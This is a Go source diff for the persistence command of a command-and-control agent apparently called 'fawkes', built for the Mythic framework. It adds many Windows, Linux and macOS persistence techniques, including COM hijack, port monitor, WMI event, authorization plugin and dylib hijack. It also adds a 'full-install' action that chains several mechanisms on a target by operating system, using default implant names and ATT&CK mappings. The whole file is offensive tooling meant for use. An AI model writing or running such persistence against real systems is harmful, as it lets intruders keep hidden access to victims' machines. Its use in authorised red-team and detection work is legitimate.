@@ -1,22 +1,68 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
+	"path/filepath"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
+
+// Chain completion function for persist full-install
+func persistFullInstallDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{TaskID: taskData.Task.ID, Success: true}
+	parentID := taskData.Task.ID
+	searchResult, _ := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID: parentID, SearchParentTaskID: &parentID,
+	})
+	summary := "=== Full Persistence Install Complete ===\n"
+	successCount := 0
+	errorCount := 0
+	if searchResult != nil && searchResult.Success {
+		for _, task := range searchResult.Tasks {
+			status := "OK"
+			if task.Status == "error" {
+				status = "FAIL"
+				errorCount++
+			} else {
+				successCount++
+			}
+			display := task.DisplayParams
+			if display == "" {
+				display = task.CommandName
+			}
+			summary += fmt.Sprintf("  [%s] %s — %s\n", status, task.CommandName, display)
+		}
+	}
+	summary += fmt.Sprintf("\nMechanisms: %d/%d installed successfully\n", successCount, successCount+errorCount)
+	if successCount > 0 {
+		summary += "Run 'persist-enum' to verify all installed mechanisms.\n"
+	}
+	completed := true
+	response.Completed = &completed
+	response.Stdout = &summary
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID: taskData.Task.ID, Response: []byte(summary),
+	})
+	logOperationEvent(taskData.Task.ID, fmt.Sprintf("[PERSIST] Full-install on %s: %d/%d mechanisms installed", taskData.Callback.Host, successCount, successCount+errorCount), true)
+	return response
+}
 
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "persist",
-		Description:         "Install or remove persistence mechanisms (registry, startup folder, COM hijack, screensaver, IFEO, winlogon helper, print processor, accessibility features)",
-		HelpString:          "persist -method <registry|startup-folder|com-hijack|screensaver|ifeo|winlogon|print-processor|accessibility|list> -action <install|remove> [-name <name>] [-path <exe_path>] [-hive <HKCU|HKLM>] [-clsid <CLSID>] [-timeout <seconds>]",
-		Version:             4,
+		Description:         "Install or remove persistence mechanisms (registry, startup folder, COM hijack, screensaver, IFEO, winlogon helper, print processor, port monitor, accessibility features, active setup, XDG autostart)",
+		HelpString:          "persist -method <registry|startup-folder|com-hijack|screensaver|ifeo|winlogon|print-processor|port-monitor|accessibility|active-setup|time-provider|wmi-event|netsh-helper|list> -action <install|remove|check> [-name <name>] [-path <exe_path>] [-hive <HKCU|HKLM>] [-clsid <CLSID>] [-timeout <seconds>]",
+		Version:             9,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1547.001", "T1547.009", "T1546.015", "T1546.002", "T1546.012", "T1053.003", "T1543.002", "T1546.004", "T1098.004", "T1543.004", "T1070.009", "T1547.004", "T1547.012", "T1546.008"},
-		ScriptOnlyCommand:   false,
+		MitreAttackMappings: []string{"T1547.001", "T1547.002", "T1547.009", "T1547.015", "T1546.015", "T1546.002", "T1546.012", "T1053.003", "T1543.002", "T1546.004", "T1098.004", "T1543.004", "T1070.009", "T1547.004", "T1547.012", "T1546.008", "T1547.014", "T1547.013", "T1547.003", "T1547.010", "T1546.003", "T1546.007", "T1574.004"},
+		ScriptOnlyCommand: false,
+		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
+			"persistFullInstallDone": persistFullInstallDone,
+		},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -31,8 +77,8 @@ func init() {
 				ModalDisplayName: "Persistence Method",
 				CLIName:          "method",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"registry", "startup-folder", "com-hijack", "screensaver", "ifeo", "winlogon", "print-processor", "accessibility", "crontab", "systemd", "shell-profile", "ssh-key", "launchagent", "list"},
-				Description:      "Persistence method. Windows: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility. Linux: crontab, systemd, shell-profile, ssh-key. macOS: launchagent. All: list.",
+				Choices:          []string{"registry", "startup-folder", "com-hijack", "screensaver", "ifeo", "winlogon", "print-processor", "port-monitor", "accessibility", "active-setup", "time-provider", "wmi-event", "netsh-helper", "crontab", "systemd", "shell-profile", "ssh-key", "xdg-autostart", "launchagent", "periodic", "folder-action", "login-item", "auth-plugin", "dylib-hijack", "xpc-service", "list"},
+				Description:      "Persistence method. Windows: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, port-monitor, accessibility, active-setup, time-provider, wmi-event (T1546.003), netsh-helper (T1546.007). Linux: crontab, systemd, shell-profile, ssh-key, xdg-autostart. macOS: launchagent, periodic (root), folder-action, login-item, auth-plugin (root), dylib-hijack (T1574.004), xpc-service. All: list.",
 				DefaultValue:     "registry",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -46,7 +92,7 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"install", "remove"},
+				Choices:          []string{"install", "remove", "full-install"},
 				Description:      "Install or remove the persistence entry",
 				DefaultValue:     "install",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -157,7 +203,7 @@ func init() {
 				},
 			},
 		},
-		AssociatedBrowserScript: nil,
+		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "persist_new.js"), Author: "@galoryber"},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
 			method, _ := taskData.Args.GetStringArg("method")
@@ -207,6 +253,61 @@ func init() {
 			method, _ := taskData.Args.GetStringArg("method")
 			action, _ := taskData.Args.GetStringArg("action")
 			name, _ := taskData.Args.GetStringArg("name")
+			if action == "full-install" {
+				path, _ := taskData.Args.GetStringArg("path")
+				entryName := name
+				if entryName == "" {
+					entryName = "FawkesUpdate"
+				}
+				// Determine which methods to install based on OS
+				var methods []string
+				os := ""
+				for _, supported := range taskData.Callback.OS {
+					os = strings.ToLower(fmt.Sprint(supported))
+					break
+				}
+				switch {
+				case strings.Contains(strings.ToLower(taskData.Callback.Host), "win") || os == "windows" || os == "":
+					methods = []string{"registry", "startup-folder", "screensaver"}
+				case os == "linux":
+					methods = []string{"crontab", "shell-profile", "systemd"}
+				case os == "macos" || os == "darwin":
+					methods = []string{"launchagent", "folder-action", "login-item"}
+				default:
+					methods = []string{"registry", "startup-folder"}
+				}
+				display := fmt.Sprintf("full-install: %s (%s)", strings.Join(methods, ", "), entryName)
+				response.DisplayParams = &display
+				// Change action to "install" for agent, method to "list" (safe enumeration)
+				taskData.Args.SetArgValue("action", "install")
+				taskData.Args.SetArgValue("method", "list")
+				// Create parallel subtask group for all persistence methods
+				var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
+				for _, m := range methods {
+					params, _ := json.Marshal(map[string]string{
+						"method": m, "action": "install", "name": entryName, "path": path,
+					})
+					tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+						CommandName: "persist", Params: string(params),
+					})
+				}
+				// Add persist-enum verification as final task
+				tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+					CommandName: "persist-enum", Params: `{}`,
+				})
+				cb := "persistFullInstallDone"
+				if _, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+					TaskID: taskData.Task.ID, GroupName: "persist_full_install",
+					GroupCallbackFunction: &cb, Tasks: tasks,
+				}); err != nil {
+					response.Success = false
+					response.Error = fmt.Sprintf("Failed to create full-install group: %v", err)
+					return response
+				}
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					fmt.Sprintf("Full Persistence: %s + persist-enum verify", strings.Join(methods, ", ")))
+				return response
+			}
 			display := fmt.Sprintf("%s %s", action, method)
 			response.DisplayParams = &display
 			if action == "install" {
@@ -244,6 +345,14 @@ func init() {
 					}
 					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Print processor DLL: C:\\Windows\\System32\\spool\\prtprocs\\x64\\%s", path))
 					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKLM\\...\\Print Processors\\%s\\Driver", procName))
+				case "port-monitor":
+					path, _ := taskData.Args.GetStringArg("path")
+					monName := name
+					if monName == "" {
+						monName = "FawkesMon"
+					}
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Port monitor DLL: C:\\Windows\\System32\\%s", path))
+					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\%s\\Driver", monName))
 				case "accessibility":
 					path, _ := taskData.Args.GetStringArg("path")
 					target := name
@@ -251,6 +360,33 @@ func init() {
 						target = "sethc.exe"
 					}
 					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Replaced C:\\Windows\\System32\\%s with %s", target, path))
+				case "login-item":
+					path, _ := taskData.Args.GetStringArg("path")
+					itemName := name
+					if itemName == "" {
+						itemName = "FawkesHelper"
+					}
+					createArtifact(taskData.Task.ID, "Login Item", fmt.Sprintf("macOS Login Item: %s -> %s", itemName, path))
+				case "auth-plugin":
+					path, _ := taskData.Args.GetStringArg("path")
+					pluginName := name
+					if pluginName == "" {
+						pluginName = "FawkesAuth"
+					}
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Authorization Plugin: /Library/Security/SecurityAgentPlugins/%s.bundle -> %s", pluginName, path))
+					createArtifact(taskData.Task.ID, "Authorization DB", fmt.Sprintf("Mechanism: %s:auth,privileged in system.login.console", pluginName))
+				case "dylib-hijack":
+					path, _ := taskData.Args.GetStringArg("path")
+					targetPath := name
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Dylib hijack: planted %s at %s (T1574.004)", path, targetPath))
+				case "xpc-service":
+					path, _ := taskData.Args.GetStringArg("path")
+					svcName := name
+					if svcName == "" {
+						svcName = "com.fawkes.helper"
+					}
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("XPC service plist: %s -> %s", svcName, path))
+					createArtifact(taskData.Task.ID, "Process", fmt.Sprintf("launchctl load %s.plist", svcName))
 				}
 			}
 			if action == "install" || action == "remove" {
@@ -293,4 +429,35 @@ func init() {
 			return response
 		},
 	})
+}
+
+// persistMethodsForOS returns the appropriate persistence methods for a given OS string.
+func persistMethodsForOS(osName string, hostname string) []string {
+	os := strings.ToLower(osName)
+	switch {
+	case strings.Contains(strings.ToLower(hostname), "win") || os == "windows" || os == "":
+		return []string{"registry", "startup-folder", "screensaver"}
+	case os == "linux":
+		return []string{"crontab", "shell-profile", "systemd"}
+	case os == "macos" || os == "darwin":
+		return []string{"launchagent", "folder-action", "login-item"}
+	default:
+		return []string{"registry", "startup-folder"}
+	}
+}
+
+// parsePersistListOutput filters persistence listing output to extract meaningful entries.
+func parsePersistListOutput(responseText string) []string {
+	var entries []string
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "- ") || (strings.Contains(trimmed, "=") && !strings.HasPrefix(trimmed, "Key:") && !strings.HasPrefix(trimmed, "Name:") && !strings.HasPrefix(trimmed, "Value:")) {
+			continue
+		}
+		entries = append(entries, trimmed)
+	}
+	return entries
 }
